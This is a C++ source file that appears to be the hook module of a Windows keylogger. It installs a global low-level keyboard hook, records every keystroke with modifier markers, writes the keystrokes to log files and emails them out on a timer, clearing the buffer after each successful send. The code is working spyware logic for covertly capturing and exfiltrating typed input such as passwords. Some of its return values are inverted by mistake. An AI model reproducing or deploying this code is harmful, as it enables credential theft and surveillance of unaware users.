#include "../headers/KeyHooks.hpp"


std::string keylog; //Tendra todas las teclas presionadas, y se limpiara una vez se envie porr correo
HHOOK eHook= NULL;  //this is a pointer to our hook;

void Hook::send_mail_timer(){
    if(keylog.empty()) return;

    std::string last_file = IO::write_log(keylog);

    if(last_file.empty()){
        if(keylog.empty()) Helper::WriteAppLog("File creation was not succesfull. keylog content nothing");
        return;
    }
    //debug
    int x = Mail::send_mail("Log[" + last_file + "]",
                            "Debuggin purposes: " + keylog + " END",
                            IO::get_path(true) + last_file);
    switch(x){
        case -1:
        Helper::WriteAppLog("Could not send the mail. Error code: " + Helper::ToString(x) + ". couldn't create the directory");
        break;
        case -2:Helper::WriteAppLog("Could not send the mail. Error code: " + Helper::ToString(x) + ". couldn't create the script");
        break;
        case -3:Helper::WriteAppLog("Could not send the mail. Error code: " + Helper::ToString(x) + ". couldn't execute the script");
        break;
        case 7: Helper::WriteAppLog("Email Sent. Code: " + Helper::ToString(x));
        keylog.clear();  // we "clear" it, there is no point in keeping that string anymore
        break;
        case 15: Helper::WriteAppLog("Processing...");
        break;
        default: Helper::WriteAppLog("Could not send the mail. Error code: " + Helper::ToString(x));
    }

}


//the following function can also be used to "forbid" keys from the keyboard, so when they are pressed, they are ineffective
LRESULT Hook::keyboard_proc(int n_code, WPARAM wparam, LPARAM lparam){
    if(n_code < 0)
        CallNextHookEx(eHook, n_code, wparam, lparam);
    KBDLLHOOKSTRUCT *kbs = (KBDLLHOOKSTRUCT *) lparam;

    if(wparam == WM_KEYDOWN || wparam == WM_SYSKEYDOWN){ // we check if someone has pressed a key (and not released it yet)
        keylog += Keys::KEYS[kbs ->vkCode].name;
        if(kbs->vkCode == VK_RETURN) // if someone presses enter, it just goes to a new line, it doesn't log "enter"
            keylog+= '\n';
    }
    else if(wparam == WM_KEYUP || wparam == WM_SYSKEYUP){ // if the keys' state is "up"
        DWORD key = kbs->vkCode;
        if(key == VK_CONTROL || key == VK_LCONTROL ||key == VK_RCONTROL ||
           key == VK_SHIFT   || key == VK_LSHIFT   ||key == VK_RSHIFT   ||
           key == VK_MENU    || key == VK_LMENU    ||key == VK_RMENU    ||
           key == VK_CAPITAL || key == VK_NUMLOCK  ||
           key == VK_LWIN    || key == VK_RWIN){
            std::string control_keys = Keys::KEYS[kbs->vkCode].name;
            control_keys.insert(1, "/"); // inserting the backslash for the e.g. [SHIFT]...[/SHIFT]
            keylog += control_keys;
        }
    }
return CallNextHookEx(eHook, n_code, wparam, lparam);  // we return it to the system
}



bool Hook::install_hook(){
    Helper::WriteAppLog("Hook started... Timer starter");
    Hook::timer_for_mail.start_timer(true);

    eHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC) keyboard_proc, GetModuleHandle(NULL), 0);
//last parameter : DWORD = 0 (the hook procedure is associated with all existing threads running in the same desktop as the calling thread)
    return (bool) (eHook == NULL);
}


bool Hook::unistall_hook(){
    BOOL b = UnhookWindowsHookEx(eHook);
    eHook = NULL;
    return (bool) b;
}

bool Hook::is_hooked(){
    return (bool)(eHook == NULL);
}



